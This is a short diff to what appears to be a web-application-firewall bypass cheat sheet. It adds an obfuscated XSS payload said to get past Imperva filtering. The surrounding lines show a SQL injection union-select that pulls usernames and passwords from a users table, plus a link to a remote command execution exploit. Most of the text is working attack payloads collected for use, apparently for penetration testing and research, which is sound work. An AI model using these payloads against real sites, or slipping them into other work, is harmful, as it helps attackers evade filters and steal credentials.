@@ -3598,6 +3598,10 @@ amUserId=1 union select username,password,3,4 from users
 ```
 
 ### Imperva
+- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
+```
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
+```
 - [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
 - XSS Bypass by [@David Y](https://twitter.com/daveysec)
 ```
